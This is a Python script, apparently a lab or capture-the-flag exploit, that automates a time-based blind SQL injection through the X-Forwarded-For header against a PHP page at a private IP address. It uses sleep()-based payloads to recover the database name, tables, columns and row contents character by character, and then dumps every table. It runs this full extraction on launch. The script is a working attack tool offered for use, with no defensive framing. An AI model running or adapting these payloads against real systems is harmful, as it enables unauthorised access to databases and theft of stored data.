import requests
import time
import string
from tabulate import tabulate

'''
Don't forget that attacking such a vulnerability locally would be easier, since it's faster and the requests not transfer through the network
and this reduce the possibility of losing data that caused by congested netword and queues overflows 

'''

def PrintTable(head=None, body=None):
	print(tabulate(body, headers=head, tablefmt="grid"), '\n')


params = (
    ('id', '1'),
)

Req = requests.Session()

def GET(Payload, R=[],Code=False):
	for r in R:
		Payload = Payload.replace('%s', str(r), 1)

	T = time.time()

	response = Req.get('http://192.168.1.187/cat.php', headers={ 	# ChangeTheURL
		'X-Forwarded-For': '''{}'''.format(Payload),
	}, params=params, verify=False)

	E = int(time.time() - T)
	
	if Code:
		print(response.status_code)

	return E

def LenOfDB():
	for i in range(100):
		E = GET(Payload='''1' OR IF ((SELECT LENGTH(database()) FROM dual) = %s , sleep(1), 'a')-- -''', R=[i],Code=False)
		if E >= 1:
			print("LenOFDbName =", i)
			return i


def GetDB():
	A = list('_'*LenOfDB())
	DB = ''
	for i in range(len(A)):
		for c in (string.ascii_lowercase):
			A[i] = c
			E = GET(Payload='''1' OR (select sleep(1) from dual where database() like '%s')-- -''', R = [''.join(A)],Code=False)
			if E >= 1:
				DB += c 
				break
	PrintTable(head=["Database Name"], body=[[DB]])
	return DB


def NumOfTablesInDB(DB=GetDB()):	
	for N in range(100):
		E = GET(Payload='''1' OR IF ((SELECT count(table_name) FROM information_schema.columns where table_schema=database()) = %s , sleep(1), 'a')-- -''', R = [N],Code=False)
		if E >= 1:
			print("NumOfTablesInDB =", N)
			return N


def NumOfColInTable(TableName):
	for N in range(100):
		E = GET(Payload='''1' OR IF ((SELECT COUNT(*) FROM information_schema.columns where table_name='{}') = %s , sleep(1), 'a')-- -'''.format(TableName), R = [N],Code=False)
		if E >= 1:
			print("NumOfColInTable({}) =".format(TableName), N)
			return N


def NumOfRowInTable(TableName):
	for N in range(100):
		E = GET(Payload='''1' OR IF ((SELECT COUNT(*) FROM {}) = %s , sleep(1), 'a')-- -'''.format(TableName), R = [N],Code=False)
		if E >= 1:
			print("NumOfRowInTable({}) =".format(TableName), N)
			return N


def GetAllTables(NumOfTables=NumOfTablesInDB()):
	Tables = {}
	for O in range(NumOfTables):
		for L in range(100):
			E = GET(Payload='''1' OR IF ((SELECT LENGTH(table_name) FROM information_schema.columns where table_schema=database() limit 1 offset %s) = %s , sleep(1), 'a')-- -''', R=[O, L],Code=False)
			if E >= 1:
				print(str("LenOfTableName #{}".format(O+1)) + " = " + str(L))
				# LOET.append(L)

				TN = ""
				for i in range(L+1):
					for c in (string.ascii_lowercase):
						E = GET(Payload='''1' OR IF ((SELECT SUBSTRING(table_name,%s,1) FROM information_schema.columns where table_schema=database() limit %s,1) = '%s' , sleep(1), 'a')-- -''', R=[i, O, c],Code=False)
						if E >= 1:
							TN += c
							break

				Tables[TN] = (NumOfColInTable(TN), NumOfRowInTable(TN))
				break
	
	print("Tables Info")
	for T in Tables.keys():
		print("TableName :", T)
		PrintTable(head=["NumOfCols", "NumOfRows"], body=[Tables[T]])
	return Tables
	


def GetAllColumns(Tables=GetAllTables()):
	Columns = []
	FinalDict = {}
	for T in Tables.keys():
		for O in range(Tables[T][0]):
			for L in range(100):
				E = GET(Payload='''1' OR IF ((SELECT LENGTH(column_name) FROM information_schema.columns where table_name='{}' limit 1 offset %s) = %s , sleep(1), 'a')-- -'''.format(T), R=[O, L],Code=False)
				if E >= 1:
					print(str("LenOfColName #{} Of({})".format(O+1, T)) + " = " + str(L))

					CN = ""
					for i in range(L+1):
						for c in (string.ascii_lowercase):
							E = GET(Payload='''1' OR IF ((SELECT SUBSTRING(column_name,%s,1) FROM information_schema.columns where table_name='{}' limit %s,1) = '%s' , sleep(1), 'a')-- -'''.format(T), R=[i, O, c],Code=False)
							if E >= 1:
								CN += c
								break

					Columns.append(CN)
					break

		FinalDict[T] = (Tables[T][0], Tables[T][1], Columns)
		Columns = []
		
	print("Tables Info")
	for T in FinalDict.keys():
		print("ColumnsOfTable({})".format(T))
		print(tabulate([FinalDict[T][2]]), '\n')
	return FinalDict


def DumpAll(All=GetAllColumns()):
	D = []
	for T in All.keys():
		for O in range(All[T][1]):
			for L in range(1000):
				E = GET(Payload='''1' OR IF ((SELECT LENGTH(CONCAT({})) FROM {} limit %s,1) = %s , sleep(1), 'a')-- -'''.format(", ' : ', ".join(All[T][2]), T), R=[O,L],Code=False)
				if E >= 1:
					print(str("LenOfDataOfRow #{} Of({})".format(O+1, T)) + " = " + str(L))

					Data = ""
					for i in range(L+1):
						for c in (string.ascii_lowercase + string.digits + string.punctuation):
							E = GET(Payload='''1' OR IF ((SELECT SUBSTRING(CONCAT({}), %s, 1) FROM {} limit %s,1) = '%s' , sleep(1), 'a')-- -'''.format(", ' : ', ".join(All[T][2]), T), R=[i, O, c], Code=False)
							if E >= 1:
								Data += c
								break

					D.append(Data)
					break

		print(tabulate([d.split(":") for d in D], headers=All[T][2], tablefmt="grid"), '\n')
		D = []




# Let's Gooooooo 
DumpAll()

